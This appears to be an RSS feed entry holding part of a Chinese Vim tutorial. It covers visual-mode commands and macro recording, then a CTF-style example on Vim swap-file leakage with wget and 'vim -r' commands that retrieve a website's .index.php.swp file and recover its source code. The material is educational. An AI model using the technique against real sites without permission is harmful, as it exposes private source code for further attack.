&lt;p&gt;&lt;strong&gt;~&lt;/strong&gt; &amp;ndash; 对高亮文本进行&lt;strong&gt;大小写转换&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&amp;gt; / &amp;lt;&lt;/strong&gt; &amp;ndash; 对高亮文本增加/减少缩进，幅度为&lt;strong&gt;一个Tab键&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;r&lt;/strong&gt; &amp;ndash; 输入单个字符，把高亮文本所有字符逐个替换为该字符&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;vim宏录制&#34;&gt;vim宏录制
&lt;/h2&gt;&lt;h3 id=&#34;宏录制的录制操作&#34;&gt;宏录制的录制操作
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;假设需要将文本的每一行的行首插入入一个 tab 键&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先将光标移动到第一行，在普通模式下按下 q 键（&lt;strong&gt;宏录制是 q 键启动的&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;按一个 a （字母随意）,表示该宏注册为 a&lt;/li&gt;
&lt;li&gt;按下 I 在行首插入一个 tab 键&lt;/li&gt;
&lt;li&gt;按下ESC退出编辑模式&lt;/li&gt;
&lt;li&gt;按下 j 将光标移动到下一行行首&lt;/li&gt;
&lt;li&gt;按下 q 键完成录制操作（&lt;strong&gt;宏录制是 q 键结束的&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;mark&gt;主要步骤：&lt;strong&gt;q(开始）&lt;/strong&gt;-&amp;gt; &lt;strong&gt;a(命名)&lt;/strong&gt; -&amp;gt; &lt;strong&gt;操作&lt;/strong&gt; -&amp;gt; &lt;strong&gt;q(结束)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h3 id=&#34;宏录制的使用&#34;&gt;宏录制的使用
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;@a&lt;/strong&gt; &amp;ndash; 执行a宏录制的一系列动作，注意&lt;strong&gt;a是录制的操作名称&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;n@a&lt;/strong&gt; &amp;ndash; 执行&lt;strong&gt;n次&lt;/strong&gt;a宏&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;@@&lt;/strong&gt; &amp;ndash; 重复上一次使用的宏操作&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;vim相关案例&#34;&gt;VIM相关案例
&lt;/h1&gt;&lt;h2 id=&#34;vim缓存泄露&#34;&gt;vim缓存泄露
&lt;/h2&gt;&lt;h3 id=&#34;vim交换文件&#34;&gt;vim交换文件
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在用vim打开文件1.txt，直接关闭终端，再次试图用vim打开1.txt时会出现如下提示：&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250311194714710.png&#34; alt=&#34;image-20250311194714710&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;p&gt;选择恢复（R），弹出如下提示：&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250311195430374.png&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;Vim 中，当处理同一个文件发生多次异常退出时，它会依次使用不同的后缀来命名交换文件。按照你给出的模式，首次产生的交换文件名为 &lt;code&gt;.index.php.swp&lt;/code&gt;，再次意外退出后产生 &lt;code&gt;.index.php.swo&lt;/code&gt;，第三次产生的交换文件为 &lt;code&gt;.index.php.swn&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;从第四次开始及之后的交换文件，Vim 会循环使用这三个后缀（.swp, .swo, .swn）&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;例题&#34;&gt;例题
&lt;/h3&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/4b76d009d10ed0cb65aaad6f5f85d2cc.png&#34; alt=&#34;在这里插入图片描述&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;p&gt;使用以下命令获取网站中的vim文件缓存：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://xxx/.index.php.swp -P /home       //-P指定下载位置
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用vim -r恢复文件并打开:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim -r .index.php.swp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取到网站源码后，进行代码审计即可&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
